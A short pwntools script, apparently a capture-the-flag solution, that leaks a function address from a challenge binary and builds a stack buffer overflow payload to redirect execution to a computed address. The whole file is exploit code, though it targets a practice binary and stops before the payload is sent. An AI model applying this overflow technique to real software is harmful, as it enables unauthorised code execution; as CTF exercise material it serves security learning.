from pwn import *

# no canary, everything else green

p = process('./chall_05')

p.sendline(b'junk')

p.recvuntil(b'win: ')

main_leak = int(p.recvline().decode('utf-8').strip(), 16) # main address

offset = 0x40

diff = 0x13

payload = cyclic(offset - 0x8) + p64(main_leak - diff)